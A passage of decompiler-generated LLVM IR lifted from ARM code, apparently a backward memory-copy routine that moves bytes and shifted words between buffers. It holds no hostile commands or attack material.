  %v6_14eac = add i32 %v5_14ea4, -2
  %v7_14eac = inttoptr i32 %v6_14eac to i8*
  store i8 %v6_14ea8, i8* %v7_14eac, align 1
  %v8_14eac = load i32, i32* %r0.global-to-local, align 4
  %v9_14eac = add i32 %v8_14eac, -1
  store i32 %v9_14eac, i32* %r0.global-to-local, align 4
  %v1_14eb0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14eb0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_14eb4 = phi i32 [ %v9_14eac, %bb152 ], [ %v6_14ea4, %bb151 ]
  %v2_14eb4 = phi i1 [ %v2_14eb0.pre, %bb152 ], [ %v1_14ea8, %bb151 ]
  %v1_14eb4 = phi i1 [ %v1_14eb0.pre, %bb152 ], [ %v0_14ea8, %bb151 ]
  %v0_14eb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_14eb0 = xor i1 %v2_14eb4, %v1_14eb4
  %v4_14eb0 = or i1 %v0_14eb0, %v3_14eb0
  br i1 %v4_14eb0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_14eb0 = load i32, i32* %r1.global-to-local, align 4
  %v6_14eb0 = add i32 %v5_14eb0, -1
  %v7_14eb0 = inttoptr i32 %v6_14eb0 to i8*
  %v8_14eb0 = load i8, i8* %v7_14eb0, align 1
  %v9_14eb0 = zext i8 %v8_14eb0 to i32
  store i32 %v9_14eb0, i32* @r3, align 4
  store i32 %v6_14eb0, i32* %r1.global-to-local, align 4
  %v8_14eb4 = add i32 %v7_14eb4, -1
  %v9_14eb4 = inttoptr i32 %v8_14eb4 to i8*
  store i8 %v8_14eb0, i8* %v9_14eb4, align 1
  %v10_14eb4 = load i32, i32* %r0.global-to-local, align 4
  %v11_14eb4 = add i32 %v10_14eb4, -1
  store i32 %v11_14eb4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_14ebc:                               ; preds = %dec_label_pc_14e14
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14ebc = icmp eq i32 %v1_14e14, 1
  store i1 %v8_14ebc, i1* %cpsr_n.global-to-local, align 1
  %v9_14ebc = icmp eq i32 %v1_14e14, 2
  store i1 %v9_14ebc, i1* %cpsr_z.global-to-local, align 1
  %v1_14ec0 = add i32 %v2_14e04, -1
  %v2_14ec0 = inttoptr i32 %v1_14ec0 to i8*
  %v3_14ec0 = load i8, i8* %v2_14ec0, align 1
  %v4_14ec0 = zext i8 %v3_14ec0 to i32
  store i32 %v4_14ec0, i32* @r3, align 4
  store i32 %v1_14ec0, i32* %r1.global-to-local, align 4
  %v3_14ec4 = add i32 %v2_14e08, -1
  %v4_14ec4 = inttoptr i32 %v3_14ec4 to i8*
  store i8 %v3_14ec0, i8* %v4_14ec4, align 1
  %v5_14ec4 = load i32, i32* %r0.global-to-local, align 4
  %v6_14ec4 = add i32 %v5_14ec4, -1
  store i32 %v6_14ec4, i32* %r0.global-to-local, align 4
  br i1 %v8_14ebc, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_14ebc
  %v6_14ec8 = load i32, i32* %r1.global-to-local, align 4
  %v7_14ec8 = add i32 %v6_14ec8, -1
  %v8_14ec8 = inttoptr i32 %v7_14ec8 to i8*
  %v9_14ec8 = load i8, i8* %v8_14ec8, align 1
  %v10_14ec8 = zext i8 %v9_14ec8 to i32
  store i32 %v10_14ec8, i32* @r3, align 4
  store i32 %v7_14ec8, i32* %r1.global-to-local, align 4
  %v9_14ecc = add i32 %v5_14ec4, -2
  %v10_14ecc = inttoptr i32 %v9_14ecc to i8*
  store i8 %v9_14ec8, i8* %v10_14ecc, align 1
  %v11_14ecc = load i32, i32* %r0.global-to-local, align 4
  %v12_14ecc = add i32 %v11_14ecc, -1
  store i32 %v12_14ecc, i32* %r0.global-to-local, align 4
  br i1 %v9_14ebc, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_14ed0 = load i32, i32* %r1.global-to-local, align 4
  %v9_14ed0 = add i32 %v8_14ed0, -1
  %v10_14ed0 = inttoptr i32 %v9_14ed0 to i8*
  %v11_14ed0 = load i8, i8* %v10_14ed0, align 1
  %v12_14ed0 = zext i8 %v11_14ed0 to i32
  store i32 %v12_14ed0, i32* @r3, align 4
  store i32 %v9_14ed0, i32* %r1.global-to-local, align 4
  %v11_14ed4 = add i32 %v11_14ecc, -2
  %v12_14ed4 = inttoptr i32 %v11_14ed4 to i8*
  store i8 %v11_14ed0, i8* %v12_14ed4, align 1
  %v13_14ed4 = load i32, i32* %r0.global-to-local, align 4
  %v14_14ed4 = add i32 %v13_14ed4, -1
  store i32 %v14_14ed4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_14ebc, %bb155
  %v0_14f3020 = phi i32 [ %v12_14ecc, %bb154 ], [ %v6_14ec4, %dec_label_pc_14ebc ], [ %v14_14ed4, %bb155 ]
  %v0_14ed8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ed8 = load i32, i32* @ip, align 4
  %v2_14ed8 = sub i32 %v0_14ed8, %v1_14ed8
  store i32 %v2_14ed8, i32* %r2.global-to-local, align 4
  %v4_14ed8 = xor i32 %v1_14ed8, %v0_14ed8
  %v5_14ed8 = xor i32 %v2_14ed8, %v0_14ed8
  %v6_14ed8 = and i32 %v5_14ed8, %v4_14ed8
  %v7_14ed8 = icmp slt i32 %v6_14ed8, 0
  store i1 %v7_14ed8, i1* %cpsr_v.global-to-local, align 1
  %v8_14ed8 = icmp slt i32 %v2_14ed8, 0
  store i1 %v8_14ed8, i1* %cpsr_n.global-to-local, align 1
  %v9_14ed8 = icmp eq i32 %v0_14ed8, %v1_14ed8
  store i1 %v9_14ed8, i1* %cpsr_z.global-to-local, align 1
  %v5_14edc = icmp slt i32 %v0_14ed8, %v1_14ed8
  br i1 %v5_14edc, label %bb150, label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %.thread14
  %v0_14ee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ee0 = urem i32 %v0_14ee0, 4
  store i32 %v1_14ee0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14ee0 = icmp eq i32 %v1_14ee0, 0
  store i1 %v2_14ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ee0, label %dec_label_pc_14e24, label %dec_label_pc_14ee8

dec_label_pc_14ee8:                               ; preds = %dec_label_pc_14e1c, %dec_label_pc_14ee0
  %v0_14f3019 = phi i32 [ %v2_14e08, %dec_label_pc_14e1c ], [ %v0_14f3020, %dec_label_pc_14ee0 ]
  %v0_14fdc = phi i32 [ %v2_14e0c, %dec_label_pc_14e1c ], [ %v2_14ed8, %dec_label_pc_14ee0 ]
  %v0_14ee8 = phi i32 [ %v2_14e04, %dec_label_pc_14e1c ], [ %v0_14ee0, %dec_label_pc_14ee0 ]
  %v0_14ef0 = phi i32 [ %v1_14e1c, %dec_label_pc_14e1c ], [ %v1_14ee0, %dec_label_pc_14ee0 ]
  %v1_14ee8 = and i32 %v0_14ee8, -4
  store i32 %v1_14ee8, i32* %r1.global-to-local, align 4
  %v1_14eec = inttoptr i32 %v1_14ee8 to i32*
  %v2_14eec = load i32, i32* %v1_14eec, align 4
  store i32 %v2_14eec, i32* @r3, align 4
  %v7_14ef0 = icmp ult i32 %v0_14ef0, 2
  %v2_14fd4 = add i32 %v0_14fdc, -12
  %v4_14fd4 = sub i32 11, %v0_14fdc
  %v5_14fd4 = and i32 %v4_14fd4, %v0_14fdc
  %v6_14fd4 = icmp slt i32 %v5_14fd4, 0
  store i1 %v6_14fd4, i1* %cpsr_v.global-to-local, align 1
  %v7_14fd4 = icmp slt i32 %v2_14fd4, 0
  store i1 %v7_14fd4, i1* %cpsr_n.global-to-local, align 1
  %v8_14fd4 = icmp eq i32 %v0_14fdc, 12
  store i1 %v8_14fd4, i1* %cpsr_z.global-to-local, align 1
  %v5_14fd8 = icmp slt i32 %v0_14fdc, 12
  br i1 %v7_14ef0, label %dec_label_pc_14fd4, label %dec_label_pc_14ef8

dec_label_pc_14ef8:                               ; preds = %dec_label_pc_14ee8
  %v8_14ef0 = icmp eq i32 %v0_14ef0, 2
  br i1 %v8_14ef0, label %dec_label_pc_14f68, label %dec_label_pc_14efc

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14ef8
  br i1 %v5_14fd8, label %dec_label_pc_14f48, label %dec_label_pc_14f04

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14efc
  store i32 %v2_14fd4, i32* %r2.global-to-local, align 4
  %v3_14f08 = load i32, i32* @r4, align 4
  store i32 %v3_14f08, i32* %stack_var_-12, align 4
  %v6_14f08 = load i32, i32* @r5, align 4
  %v8_14f08 = inttoptr i32 %v6_14f08 to i8*
  store i8* %v8_14f08, i8** %stack_var_-8, align 4
  %v11_14f08 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge, %dec_label_pc_14f04
  %v0_14f30 = phi i32 [ %v1_14f30, %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge ], [ %v0_14f3019, %dec_label_pc_14f04 ]
  %v0_14f10 = phi i32 [ %v0_14f10.pre, %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge ], [ %v1_14ee8, %dec_label_pc_14f04 ]
  %v0_14f0c = phi i32 [ %v0_14f0c.pre, %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge ], [ %v2_14eec, %dec_label_pc_14f04 ]
  %v3_14f0c = mul i32 %v0_14f0c, 256
  store i32 %v3_14f0c, i32* %lr.global-to-local, align 4
  %v1_14f10 = add i32 %v0_14f10, -4
  %v2_14f10 = inttoptr i32 %v1_14f10 to i32*
  %v3_14f10 = load i32, i32* %v2_14f10, align 4
  store i32 %v3_14f10, i32* @r3, align 4
  %v4_14f10 = add i32 %v0_14f10, -8
  %v5_14f10 = inttoptr i32 %v4_14f10 to i32*
  %v6_14f10 = load i32, i32* %v5_14f10, align 4
  store i32 %v6_14f10, i32* %r4.global-to-local, align 4
  %v7_14f10 = add i32 %v0_14f10, -12
  %v8_14f10 = inttoptr i32 %v7_14f10 to i32*
  %v9_14f10 = load i32, i32* %v8_14f10, align 4
  store i32 %v9_14f10, i32* %r5.global-to-local, align 4
  %v10_14f10 = add i32 %v0_14f10, -16
  %v11_14f10 = inttoptr i32 %v10_14f10 to i32*
  %v12_14f10 = load i32, i32* %v11_14f10, align 4
  store i32 %v10_14f10, i32* %r1.global-to-local, align 4
  %v4_14f14 = udiv i32 %v12_14f10, 16777216
  %v5_14f14 = or i32 %v4_14f14, %v3_14f0c
  store i32 %v5_14f14, i32* %lr.global-to-local, align 4
  %v3_14f18 = mul i32 %v12_14f10, 256
  %v4_14f1c = udiv i32 %v9_14f10, 16777216
  %v5_14f1c = or i32 %v3_14f18, %v4_14f1c
  store i32 %v5_14f1c, i32* @ip, align 4
  %v3_14f20 = mul i32 %v9_14f10, 256
  %v4_14f24 = udiv i32 %v6_14f10, 16777216
  %v5_14f24 = or i32 %v3_14f20, %v4_14f24
  store i32 %v5_14f24, i32* %r5.global-to-local, align 4
  %v3_14f28 = mul i32 %v6_14f10, 256
  %v4_14f2c = udiv i32 %v3_14f10, 16777216
  %v5_14f2c = or i32 %v3_14f28, %v4_14f2c
  store i32 %v5_14f2c, i32* %r4.global-to-local, align 4
  %v1_14f30 = add i32 %v0_14f30, -16
  %v2_14f30 = inttoptr i32 %v1_14f30 to i32*
  store i32 %v5_14f2c, i32* %v2_14f30, align 4
  %v4_14f30 = add i32 %v0_14f30, -12
  %v5_14f30 = inttoptr i32 %v4_14f30 to i32*
  %v6_14f30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14f30, i32* %v5_14f30, align 4
  %v7_14f30 = add i32 %v0_14f30, -8
  %v8_14f30 = inttoptr i32 %v7_14f30 to i32*
  %v9_14f30 = load i32, i32* @ip, align 4
  store i32 %v9_14f30, i32* %v8_14f30, align 4
  %v10_14f30 = add i32 %v0_14f30, -4
  %v11_14f30 = inttoptr i32 %v10_14f30 to i32*
  %v12_14f30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14f30, i32* %v11_14f30, align 4
  store i32 %v1_14f30, i32* %r0.global-to-local, align 4
  %v0_14f34 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f34 = add i32 %v0_14f34, -16
  store i32 %v2_14f34, i32* %r2.global-to-local, align 4
  %v6_14f38 = icmp slt i32 %v0_14f34, 16
  br i1 %v6_14f38, label %dec_label_pc_14f3c, label %dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge

dec_label_pc_14f0c.dec_label_pc_14f0c_crit_edge:  ; preds = %dec_label_pc_14f0c
  %v0_14f0c.pre = load i32, i32* @r3, align 4
  %v0_14f10.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f0c

dec_label_pc_14f3c:                               ; preds = %dec_label_pc_14f0c
  %v2_14f3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f3c, i32* @r4, align 4
  %v5_14f3c = load i8*, i8** %stack_var_-8, align 4
  %v6_14f3c = ptrtoint i8* %v5_14f3c to i32
  store i32 %v6_14f3c, i32* @r5, align 4
  store i32 %v11_14f08, i32* @lr, align 4
  %v2_14f40 = add i32 %v0_14f34, -4
  store i32 %v2_14f40, i32* %r2.global-to-local, align 4
  %v4_14f40 = add i32 %v0_14f34, 2147483632
  %v5_14f40 = and i32 %v2_14f40, %v4_14f40
  %v6_14f40 = icmp slt i32 %v5_14f40, 0
  store i1 %v6_14f40, i1* %cpsr_v.global-to-local, align 1
  %v7_14f40 = icmp slt i32 %v2_14f40, 0
  store i1 %v7_14f40, i1* %cpsr_n.global-to-local, align 1
  %v8_14f40 = icmp eq i32 %v2_14f40, 0
  store i1 %v8_14f40, i1* %cpsr_z.global-to-local, align 1
  %v5_14f44 = icmp slt i32 %v2_14f34, -12
  br i1 %v5_14f44, label %dec_label_pc_14f60, label %dec_label_pc_14f48

dec_label_pc_14f48:                               ; preds = %dec_label_pc_14f3c, %dec_label_pc_14efc, %dec_label_pc_14f48
  %v1_14f54 = phi i32 [ %v5_14f54, %dec_label_pc_14f48 ], [ %v1_14f30, %dec_label_pc_14f3c ], [ %v0_14f3019, %dec_label_pc_14efc ]
  %v0_14f48 = load i32, i32* @r3, align 4
  %v3_14f48 = mul i32 %v0_14f48, 256
  store i32 %v3_14f48, i32* %ip.global-to-local, align 4
  %v0_14f4c = load i32, i32* %r1.global-to-local, align 4
  %v1_14f4c = add i32 %v0_14f4c, -4
  %v2_14f4c = inttoptr i32 %v1_14f4c to i32*
  %v3_14f4c = load i32, i32* %v2_14f4c, align 4
  store i32 %v3_14f4c, i32* @r3, align 4
  store i32 %v1_14f4c, i32* %r1.global-to-local, align 4
  %v4_14f50 = udiv i32 %v3_14f4c, 16777216
  %v5_14f50 = or i32 %v4_14f50, %v3_14f48
  store i32 %v5_14f50, i32* @ip, align 4
  %v2_14f54 = add i32 %v1_14f54, -4
  %v3_14f54 = inttoptr i32 %v2_14f54 to i32*
  store i32 %v5_14f50, i32* %v3_14f54, align 4
  %v4_14f54 = load i32, i32* %r0.global-to-local, align 4
  %v5_14f54 = add i32 %v4_14f54, -4
  store i32 %v5_14f54, i32* %r0.global-to-local, align 4
  %v0_14f58 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f58 = add i32 %v0_14f58, -4
  store i32 %v2_14f58, i32* %r2.global-to-local, align 4
  %v6_14f5c = icmp slt i32 %v0_14f58, 4
  br i1 %v6_14f5c, label %dec_label_pc_14f60.loopexit, label %dec_label_pc_14f48

dec_label_pc_14f60.loopexit:                      ; preds = %dec_label_pc_14f48
  %v4_14f58 = sub i32 3, %v0_14f58
  %v5_14f58 = and i32 %v4_14f58, %v0_14f58
  %v6_14f58 = icmp slt i32 %v5_14f58, 0
  %v7_14f58 = icmp slt i32 %v2_14f58, 0
  store i1 %v6_14f58, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14f58, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14f60

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14f60.loopexit, %dec_label_pc_14f3c
  %v2_14ea451 = phi i32 [ %v5_14f54, %dec_label_pc_14f60.loopexit ], [ %v1_14f30, %dec_label_pc_14f3c ]
  %v0_14e9447 = phi i32 [ %v2_14f58, %dec_label_pc_14f60.loopexit ], [ %v2_14f40, %dec_label_pc_14f3c ]
  %v0_14f60 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f60 = add i32 %v0_14f60, 3
  store i32 %v1_14f60, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14ef8
  br i1 %v5_14fd8, label %dec_label_pc_14fb4, label %dec_label_pc_14f70

dec_label_pc_14f70:                               ; preds = %dec_label_pc_14f68
  store i32 %v2_14fd4, i32* %r2.global-to-local, align 4
  %v3_14f74 = load i32, i32* @r4, align 4
  store i32 %v3_14f74, i32* %stack_var_-12, align 4
  %v6_14f74 = load i32, i32* @r5, align 4
  %v8_14f74 = inttoptr i32 %v6_14f74 to i8*
  store i8* %v8_14f74, i8** %stack_var_-8, align 4
  %v11_14f74 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14f78.dec_label_pc_14f78_crit_edge, %dec_label_pc_14f70
  %v0_14f9c = phi i32 [ %v1_14f9c, %dec_label_pc_14f78.dec_label_pc_14f78_crit_edge ], [ %v0_14f3019, %dec_label_pc_14f70 ]
  %v0_14f7c = phi i32 [ %v0_14f7c.pre, %dec_label_pc_14f78.dec_label_pc_14f78_crit_edge ], [ %v1_14ee8, %dec_label_pc_14f70 ]
  %v0_14f78 = phi i32 [ %v0_14f78.pre, %dec_label_pc_14f78.dec_label_pc_14f78_crit_edge ], [ %v2_14eec, %dec_label_pc_14f70 ]
  %v3_14f78 = mul i32 %v0_14f78, 65536
  store i32 %v3_14f78, i32* %lr.global-to-local, align 4
  %v1_14f7c = add i32 %v0_14f7c, -4
  %v2_14f7c = inttoptr i32 %v1_14f7c to i32*
  %v3_14f7c = load i32, i32* %v2_14f7c, align 4
  store i32 %v3_14f7c, i32* @r3, align 4
  %v4_14f7c = add i32 %v0_14f7c, -8
  %v5_14f7c = inttoptr i32 %v4_14f7c to i32*
  %v6_14f7c = load i32, i32* %v5_14f7c, align 4
  store i32 %v6_14f7c, i32* %r4.global-to-local, align 4
  %v7_14f7c = add i32 %v0_14f7c, -12
  %v8_14f7c = inttoptr i32 %v7_14f7c to i32*
  %v9_14f7c = load i32, i32* %v8_14f7c, align 4
  store i32 %v9_14f7c, i32* %r5.global-to-local, align 4
  %v10_14f7c = add i32 %v0_14f7c, -16
  %v11_14f7c = inttoptr i32 %v10_14f7c to i32*
  %v12_14f7c = load i32, i32* %v11_14f7c, align 4
  store i32 %v10_14f7c, i32* %r1.global-to-local, align 4
  %v4_14f80 = udiv i32 %v12_14f7c, 65536
  %v5_14f80 = or i32 %v4_14f80, %v3_14f78
  store i32 %v5_14f80, i32* %lr.global-to-local, align 4
  %v3_14f84 = mul i32 %v12_14f7c, 65536
  %v4_14f88 = udiv i32 %v9_14f7c, 65536
  %v5_14f88 = or i32 %v3_14f84, %v4_14f88
  store i32 %v5_14f88, i32* @ip, align 4
  %v3_14f8c = mul i32 %v9_14f7c, 65536
  %v4_14f90 = udiv i32 %v6_14f7c, 65536
  %v5_14f90 = or i32 %v3_14f8c, %v4_14f90
  store i32 %v5_14f90, i32* %r5.global-to-local, align 4
  %v3_14f94 = mul i32 %v6_14f7c, 65536
  %v4_14f98 = udiv i32 %v3_14f7c, 65536
  %v5_14f98 = or i32 %v3_14f94, %v4_14f98
  store i32 %v5_14f98, i32* %r4.global-to-local, align 4
  %v1_14f9c = add i32 %v0_14f9c, -16
  %v2_14f9c = inttoptr i32 %v1_14f9c to i32*
  store i32 %v5_14f98, i32* %v2_14f9c, align 4
  %v4_14f9c = add i32 %v0_14f9c, -12
  %v5_14f9c = inttoptr i32 %v4_14f9c to i32*
  %v6_14f9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14f9c, i32* %v5_14f9c, align 4
  %v7_14f9c = add i32 %v0_14f9c, -8
  %v8_14f9c = inttoptr i32 %v7_14f9c to i32*
  %v9_14f9c = load i32, i32* @ip, align 4
  store i32 %v9_14f9c, i32* %v8_14f9c, align 4
  %v10_14f9c = add i32 %v0_14f9c, -4
  %v11_14f9c = inttoptr i32 %v10_14f9c to i32*
  %v12_14f9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14f9c, i32* %v11_14f9c, align 4
  store i32 %v1_14f9c, i32* %r0.global-to-local, align 4
  %v0_14fa0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14fa0 = add i32 %v0_14fa0, -16
  store i32 %v2_14fa0, i32* %r2.global-to-local, align 4
  %v6_14fa4 = icmp slt i32 %v0_14fa0, 16
  br i1 %v6_14fa4, label %dec_label_pc_14fa8, label %dec_label_pc_14f78.dec_label_pc_14f78_crit_edge

dec_label_pc_14f78.dec_label_pc_14f78_crit_edge:  ; preds = %dec_label_pc_14f78
  %v0_14f78.pre = load i32, i32* @r3, align 4
  %v0_14f7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f78

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_14f78
  %v2_14fa8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14fa8, i32* @r4, align 4
  %v5_14fa8 = load i8*, i8** %stack_var_-8, align 4
  %v6_14fa8 = ptrtoint i8* %v5_14fa8 to i32
  store i32 %v6_14fa8, i32* @r5, align 4
  store i32 %v11_14f74, i32* @lr, align 4
  %v2_14fac = add i32 %v0_14fa0, -4
  store i32 %v2_14fac, i32* %r2.global-to-local, align 4
  %v4_14fac = add i32 %v0_14fa0, 2147483632
  %v5_14fac = and i32 %v2_14fac, %v4_14fac
  %v6_14fac = icmp slt i32 %v5_14fac, 0
  store i1 %v6_14fac, i1* %cpsr_v.global-to-local, align 1
  %v7_14fac = icmp slt i32 %v2_14fac, 0
  store i1 %v7_14fac, i1* %cpsr_n.global-to-local, align 1
  %v8_14fac = icmp eq i32 %v2_14fac, 0
  store i1 %v8_14fac, i1* %cpsr_z.global-to-local, align 1
  %v5_14fb0 = icmp slt i32 %v2_14fa0, -12
  br i1 %v5_14fb0, label %dec_label_pc_14fcc, label %dec_label_pc_14fb4

dec_label_pc_14fb4:                               ; preds = %dec_label_pc_14fa8, %dec_label_pc_14f68, %dec_label_pc_14fb4
  %v1_14fc0 = phi i32 [ %v5_14fc0, %dec_label_pc_14fb4 ], [ %v1_14f9c, %dec_label_pc_14fa8 ], [ %v0_14f3019, %dec_label_pc_14f68 ]
  %v0_14fb4 = load i32, i32* @r3, align 4
  %v3_14fb4 = mul i32 %v0_14fb4, 65536
  store i32 %v3_14fb4, i32* %ip.global-to-local, align 4
  %v0_14fb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fb8 = add i32 %v0_14fb8, -4
  %v2_14fb8 = inttoptr i32 %v1_14fb8 to i32*
  %v3_14fb8 = load i32, i32* %v2_14fb8, align 4
  store i32 %v3_14fb8, i32* @r3, align 4
  store i32 %v1_14fb8, i32* %r1.global-to-local, align 4
  %v4_14fbc = udiv i32 %v3_14fb8, 65536
  %v5_14fbc = or i32 %v4_14fbc, %v3_14fb4
  store i32 %v5_14fbc, i32* @ip, align 4
  %v2_14fc0 = add i32 %v1_14fc0, -4
  %v3_14fc0 = inttoptr i32 %v2_14fc0 to i32*
  store i32 %v5_14fbc, i32* %v3_14fc0, align 4
  %v4_14fc0 = load i32, i32* %r0.global-to-local, align 4
  %v5_14fc0 = add i32 %v4_14fc0, -4
  store i32 %v5_14fc0, i32* %r0.global-to-local, align 4
  %v0_14fc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_14fc4 = add i32 %v0_14fc4, -4
  store i32 %v2_14fc4, i32* %r2.global-to-local, align 4
  %v6_14fc8 = icmp slt i32 %v0_14fc4, 4
  br i1 %v6_14fc8, label %dec_label_pc_14fcc.loopexit, label %dec_label_pc_14fb4

dec_label_pc_14fcc.loopexit:                      ; preds = %dec_label_pc_14fb4
  %v4_14fc4 = sub i32 3, %v0_14fc4
  %v5_14fc4 = and i32 %v4_14fc4, %v0_14fc4
  %v6_14fc4 = icmp slt i32 %v5_14fc4, 0
  %v7_14fc4 = icmp slt i32 %v2_14fc4, 0
  store i1 %v6_14fc4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14fc4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14fcc

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14fcc.loopexit, %dec_label_pc_14fa8
  %v2_14ea452 = phi i32 [ %v5_14fc0, %dec_label_pc_14fcc.loopexit ], [ %v1_14f9c, %dec_label_pc_14fa8 ]
  %v0_14e9448 = phi i32 [ %v2_14fc4, %dec_label_pc_14fcc.loopexit ], [ %v2_14fac, %dec_label_pc_14fa8 ]
  %v0_14fcc = load i32, i32* %r1.global-to-local, align 4
  %v1_14fcc = add i32 %v0_14fcc, 2
  store i32 %v1_14fcc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14ee8
  br i1 %v5_14fd8, label %dec_label_pc_15020, label %dec_label_pc_14fdc

dec_label_pc_14fdc:                               ; preds = %dec_label_pc_14fd4
  store i32 %v2_14fd4, i32* %r2.global-to-local, align 4
  %v3_14fe0 = load i32, i32* @r4, align 4
  store i32 %v3_14fe0, i32* %stack_var_-12, align 4
  %v6_14fe0 = load i32, i32* @r5, align 4
  %v8_14fe0 = inttoptr i32 %v6_14fe0 to i8*
  store i8* %v8_14fe0, i8** %stack_var_-8, align 4
  %v11_14fe0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14fe4

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_14fe4.dec_label_pc_14fe4_crit_edge, %dec_label_pc_14fdc
  %v0_15008 = phi i32 [ %v1_15008, %dec_label_pc_14fe4.dec_label_pc_14fe4_crit_edge ], [ %v0_14f3019, %dec_label_pc_14fdc ]
  %v0_14fe8 = phi i32 [ %v0_14fe8.pre, %dec_label_pc_14fe4.dec_label_pc_14fe4_crit_edge ], [ %v1_14ee8, %dec_label_pc_14fdc ]
  %v0_14fe4 = phi i32 [ %v0_14fe4.pre, %dec_label_pc_14fe4.dec_label_pc_14fe4_crit_edge ], [ %v2_14eec, %dec_label_pc_14fdc ]
  %v3_14fe4 = mul i32 %v0_14fe4, 16777216
  store i32 %v3_14fe4, i32* %lr.global-to-local, align 4
  %v1_14fe8 = add i32 %v0_14fe8, -4
  %v2_14fe8 = inttoptr i32 %v1_14fe8 to i32*
  %v3_14fe8 = load i32, i32* %v2_14fe8, align 4
  store i32 %v3_14fe8, i32* @r3, align 4
  %v4_14fe8 = add i32 %v0_14fe8, -8
  %v5_14fe8 = inttoptr i32 %v4_14fe8 to i32*
  %v6_14fe8 = load i32, i32* %v5_14fe8, align 4
  store i32 %v6_14fe8, i32* %r4.global-to-local, align 4
  %v7_14fe8 = add i32 %v0_14fe8, -12
  %v8_14fe8 = inttoptr i32 %v7_14fe8 to i32*
  %v9_14fe8 = load i32, i32* %v8_14fe8, align 4
  store i32 %v9_14fe8, i32* %r5.global-to-local, align 4
  %v10_14fe8 = add i32 %v0_14fe8, -16
  %v11_14fe8 = inttoptr i32 %v10_14fe8 to i32*
  %v12_14fe8 = load i32, i32* %v11_14fe8, align 4
  store i32 %v10_14fe8, i32* %r1.global-to-local, align 4
  %v4_14fec = udiv i32 %v12_14fe8, 256
  %v5_14fec = or i32 %v4_14fec, %v3_14fe4
  store i32 %v5_14fec, i32* %lr.global-to-local, align 4
  %v3_14ff0 = mul i32 %v12_14fe8, 16777216
  %v4_14ff4 = udiv i32 %v9_14fe8, 256
  %v5_14ff4 = or i32 %v3_14ff0, %v4_14ff4
  store i32 %v5_14ff4, i32* @ip, align 4
  %v3_14ff8 = mul i32 %v9_14fe8, 16777216
  %v4_14ffc = udiv i32 %v6_14fe8, 256
  %v5_14ffc = or i32 %v3_14ff8, %v4_14ffc
  store i32 %v5_14ffc, i32* %r5.global-to-local, align 4
  %v3_15000 = mul i32 %v6_14fe8, 16777216
  %v4_15004 = udiv i32 %v3_14fe8, 256
  %v5_15004 = or i32 %v3_15000, %v4_15004
  store i32 %v5_15004, i32* %r4.global-to-local, align 4
  %v1_15008 = add i32 %v0_15008, -16
  %v2_15008 = inttoptr i32 %v1_15008 to i32*
  store i32 %v5_15004, i32* %v2_15008, align 4
  %v4_15008 = add i32 %v0_15008, -12
  %v5_15008 = inttoptr i32 %v4_15008 to i32*
  %v6_15008 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15008, i32* %v5_15008, align 4
  %v7_15008 = add i32 %v0_15008, -8
  %v8_15008 = inttoptr i32 %v7_15008 to i32*
  %v9_15008 = load i32, i32* @ip, align 4
  store i32 %v9_15008, i32* %v8_15008, align 4
  %v10_15008 = add i32 %v0_15008, -4
  %v11_15008 = inttoptr i32 %v10_15008 to i32*
  %v12_15008 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15008, i32* %v11_15008, align 4
  store i32 %v1_15008, i32* %r0.global-to-local, align 4
